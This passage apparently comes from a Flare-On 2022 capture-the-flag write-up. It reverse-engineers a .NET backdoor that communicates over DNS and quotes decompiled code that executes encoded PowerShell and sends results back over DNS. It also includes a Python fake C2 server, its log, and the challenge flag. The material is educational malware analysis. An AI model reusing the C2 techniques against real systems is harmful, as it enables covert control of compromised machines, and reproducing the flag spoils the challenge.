    										text = Cmd.Powershell("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4AMgAyAC4ANAAyACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAyADMALgAyADAAMAAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4ANAA1AC4AMQA5ACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADkALgA1ADAAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA=");
    									}
    								}
    ...[snip]...
    					}
    					string s2 = Cmd.ShrinkCmdResult(Cmd.ExecCmd(text));
    					resultData = Encoding.UTF8.GetBytes(s2);
    				});
    ...[snip]...
    

At the end, it runs `text`, which is either the c2 input (for `TaskType.Cmd`),
decompressed input (for `TaskType.CompressedCmd`), or a static string loaded
from the input by number (for `TaskType.Static`). The results are processed,
queued for transmission back over DNS.

#### Difference in flared_56

There’s only one major difference in `flared_56`, and it’s in the `Static`
section. In the malware, if the static command is 19, it looks like this:

    
    
    if (text == "19")
    {
        text = Cmd.Powershell("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAA1AC4AMwAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAAuADUAMgAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4AMwAxAC4AMQA1ADUAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgAGkAcwBlAC0AcABvAHMAdAB1AHIAZQAuAG0AbwBmAGEAZwBvAHYALgBnAG8AdgBlAHIALgBsAG8AYwBhAGwAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA=");
    }
    

In the challenge, it looks like this:

    
    
    bool flag15 = text == "19";
    if (flag15)
    {
        FLARE14.flare_56(int.Parse(text), "146");
        text = FLARE02.flare_04("JChwaW5nIC1uIDEgMTAuNjUuNDUuMyB8IGZpbmRzdHIgL2kgdHRsKSAtZXEgJG51bGw7JChwaW5nIC1uIDEgMTAuNjUuNC41MiB8IGZpbmRzdHIgL2kgdHRsKSAtZXEgJG51bGw7JChwaW5nIC1uIDEgMTAuNjUuMzEuMTU1IHwgZmluZHN0ciAvaSB0dGwpIC1lcSAkbnVsbDskKHBpbmcgLW4gMSBmbGFyZS1vbi5jb20gfCBmaW5kc3RyIC9pIHR0bCkgLWVxICRudWxs");
        FLARE14.h.AppendData(Encoding.ASCII.GetBytes(FLARE14.flare_57() + text));
    }
    

The encoded PowerShell is different, but there’s also two additional
functions, `flare_56` (which calls `flared_55`, not to be confused with
`flared_56`, which is the `DoTask` function), and `flare_57`. Neither of these
have been decoded yet.

#### Send Static Command

I’ll update my DNS server to send a static command:

    
    
    def ip_gen():
    
        yield '75.99.87.223'
    
        yield '129.0.0.3'
    
        yield '43.49.57.49'
        #yield '79.118.101.114'
    
        while True:
            yield '129.0.0.1'
    

It will send `129.0.0.3` and then `43.49.57.49`:

  * `129` \- Any number between 129 and 255
  * `0.0.3` \- the size of 3 bytes
  * `43` \- `TaskType.Static`
  * `49` \- `ord("1")`
  * `57` \- `ord("9")`
  * `49` \- padding to reach full IP

With a break point at the first call once it checks if the input is “19”, I’ll
run it, and it hits:

![image-20221020061939008](https://0xdfimages.gitlab.io/img/image-20221020061939008.png)

This confirms my DNS C2 is correct. It also gets me the chance to decode a
bunch more functions.

#### flared_55

`flare_56` deobfuscates `flared_55`, which is the key to getting the flag:

    
    
    public static void flared_55(int i, string s)
    {
        bool flag = FLARE15.c.Count != 0 && FLARE15.c[0] == (i ^ 248);
        if (flag)
        {
            FLARE14.sh += s;
            FLARE15.c.Remove(i ^ 248);
        }
        else
        {
            FLARE14._bool = false;
        }
    }
    

`FLARE15.c` is initialized in that first initialization function, `flare_74`,
to an array of 21 single byte ints. `i` is the command I sent, and if `i ^
248` matches the first item in that array, it appends the three characters hex
string to `FLARE14.sh`, and removes that item from `FLARE15.c`. This is
defining the order of the commands I must send.

### Get Flag

#### Calculate Order

`FLARE15.c` is initialized at the very start in `flare_74`:

    
    
    FLARE15.c = new ObservableCollection<int>
    {
        250,
        242,
        240,
        235,
        243,
        249,
        247,
        245,
        238,
        232,
        253,
        244,
        237,
        251,
        234,
        233,
        236,
        246,
        241,
        255,
        252
    };
    

In a Python terminal I can quickly find the command order:

    
    
    >>> c = [250, 242, 240, 235, 243, 249, 247, 245, 238, 232, 253, 244, 237, 251, 234, 233, 236, 246, 241, 255, 252]
    >>> [x^248 for x in c]
    [2, 10, 8, 19, 11, 1, 15, 13, 22, 16, 5, 12, 21, 3, 18, 17, 20, 14, 9, 7, 4]
    

#### Update Script

I’ll need to update the DNS server to return these static commands in order:

    
    
    import socket
    from dnslib import DNSRecord, RR
    
    # Global variables
    IP = "0.0.0.0"
    PORT = 53
    
    
    def ip_gen():
        nums = map(str, [2,10,8,19,11,1,15,13,22,16,5,12,21,3,18,17,20,14,9,7,4])
    
        yield '75.99.87.223'
    
        for n in nums:
            yield f'129.0.0.{len(n) + 1}'
            yield f'43.' + '.'.join([str(ord(x)) for x in n.ljust(3, '1')])
    
        yield '129.0.0.1'
    

This will calculate the length and then the IP for each command. It needs at
least one IP at the end to get the flag.

#### Run It

With this C2 server in place, I’ll run the binary. It takes a bit of time:

    
    
    oxdf@hacky$ python dns_c2.py 
    DNS Listening on 0.0.0.0:53 ...
    [*] Got request for 2p066l666qv4i0.flare-on.com.
    [*] Sending response 0: 75.99.87.223
    [*] Got request for f94id.flare-on.com.
    [*] Sending response 1: 129.0.0.2
    [*] Got request for a49kkk4ib.flare-on.com.
    [*] Sending response 2: 43.50.49.49
    [*] Got request for 43gzzzzz9sfehzq1e8b3x12d978kq4it.flare-on.com.
    [*] Sending response 3: 129.0.0.3
    [*] Got request for p47iikiiice4i3.flare-on.com.
    [*] Sending response 4: 43.49.48.49
    [*] Got request for 9elqqqqqj7dl6yam2yw7uq20w0c0q4i5.flare-on.com.
    [*] Sending response 5: 129.0.0.2
    [*] Got request for lr8uuauuulf4ig.flare-on.com.
    [*] Sending response 6: 43.56.49.49
    [*] Got request for 2sattttt8131balr37cj5yr4w74td4iu.flare-on.com.
    [*] Sending response 7: 129.0.0.3
    [*] Got request for lmiffkfffef4ih.flare-on.com.
    [*] Sending response 8: 43.49.57.49
    [*] Got request for urtwwwwwbz7yb6ntm1y7pabcujnlw4iw.flare-on.com.
    [*] Sending response 9: 129.0.0.3
    [*] Got request for flp66q666f44i7.flare-on.com.
    [*] Sending response 10: 43.49.49.49
    [*] Got request for j18ccccch0i7hed84a7i6yhnj9dlc4in.flare-on.com.
    [*] Sending response 11: 129.0.0.2
    [*] Got request for hsweepeeehf4i1.flare-on.com.
    [*] Sending response 12: 43.49.49.49
    [*] Got request for mrbddddd1vokude4km0r8c951atye4if.flare-on.com.
    [*] Sending response 13: 129.0.0.3
    [*] Got request for 5z466e666sm4iq.flare-on.com.
    [*] Sending response 14: 43.49.53.49
    [*] Got request for 5inpppppkoh2f9azhl72jk4iv.flare-on.com.
    [*] Sending response 15: 129.0.0.3
    [*] Got request for 9hn0004ix.flare-on.com.
    [*] Sending response 16: 43.49.51.49
    [*] Got request for mf2sssssyzxgy9627jgxkdy1mn64s4i4.flare-on.com.
    [*] Sending response 17: 129.0.0.3
    [*] Got request for 8ax66m666824ik.flare-on.com.
    [*] Sending response 18: 43.50.50.49
    [*] Got request for 13jcccccmb4jqgsud84reptdc6lba4i8.flare-on.com.
    [*] Sending response 19: 129.0.0.3
    [*] Got request for yz011t1119w4iy.flare-on.com.
    [*] Sending response 20: 43.49.54.49
    [*] Got request for zm3jjjjjvn986ec19pk8wv4i9.flare-on.com.
    [*] Sending response 21: 129.0.0.2
    [*] Got request for 7pwttt4ir.flare-on.com.
    [*] Sending response 22: 43.53.49.49
    [*] Got request for 6tlnnnnnevu7i9tz2kw0x9qco3rin4ip.flare-on.com.
    [*] Sending response 23: 129.0.0.3
    [*] Got request for gj7mmhmmmk64io.flare-on.com.
    [*] Sending response 24: 43.49.50.49
    [*] Got request for op9zzzzzh5xqj3s7x40qch4ie.flare-on.com.
    [*] Sending response 25: 129.0.0.3
    [*] Got request for aduqqq42a.flare-on.com.
    [*] Sending response 26: 43.50.49.49
    [*] Got request for 78wnnnnnqxg2jpjm16e2zw8kzi2mf42m.flare-on.com.
    [*] Sending response 27: 129.0.0.2
    [*] Got request for 50k77g7773w42s.flare-on.com.
    [*] Sending response 28: 43.51.49.49
    [*] Got request for be966666gfykjawi7u2mm67p241e642j.flare-on.com.
    [*] Sending response 29: 129.0.0.3
    [*] Got request for rpqzz0zzzcw42l.flare-on.com.
    [*] Sending response 30: 43.49.56.49
    [*] Got request for j3vsssssgmfwacpifqowyg426.flare-on.com.
    [*] Sending response 31: 129.0.0.3
    [*] Got request for wxhiii42z.flare-on.com.
    [*] Sending response 32: 43.49.55.49
    [*] Got request for v0jeeeeezyn8cd63n2h8sz42c.flare-on.com.
    [*] Sending response 33: 129.0.0.3
    [*] Got request for qzsnnn42i.flare-on.com.
    [*] Sending response 34: 43.50.48.49
    [*] Got request for os9jjjjj2xi5hlf4iap582422.flare-on.com.
    [*] Sending response 35: 129.0.0.3
    [*] Got request for a0vuuu420.flare-on.com.
    [*] Sending response 36: 43.49.52.49
    [*] Got request for nb9666667aoqi0croh4qx742d.flare-on.com.
    [*] Sending response 37: 129.0.0.2
    [*] Got request for 96rnnn42b.flare-on.com.
    [*] Sending response 38: 43.57.49.49
    [*] Got request for 3n6gggggat8tb6rf8cedu9f2sc25v42t.flare-on.com.
    [*] Sending response 39: 129.0.0.2
    [*] Got request for e0tkkmkkkuq423.flare-on.com.
    [*] Sending response 40: 43.55.49.49
    [*] Got request for l6oiiiiivqhqeo4xh8j2pgx7r8j4b425.flare-on.com.
    [*] Sending response 41: 129.0.0.2
    [*] Got request for csukkakkkew42g.flare-on.com.
    [*] Sending response 42: 43.52.49.49
    [*] Got request for ha3pppppn1rgq9d59ubaqsan02flz42u.flare-on.com.
    [*] Sending response 43: 129.0.0.1
    

But then an image appears on the screen on my Windows VM:

![](https://0xdfimages.gitlab.io/img/flag.gif)

**Flag: W3_4re_Kn0wn_f0r_b31ng_Dyn4m1c@flare-on.com**

[](/flare-on-2022/backdoor)

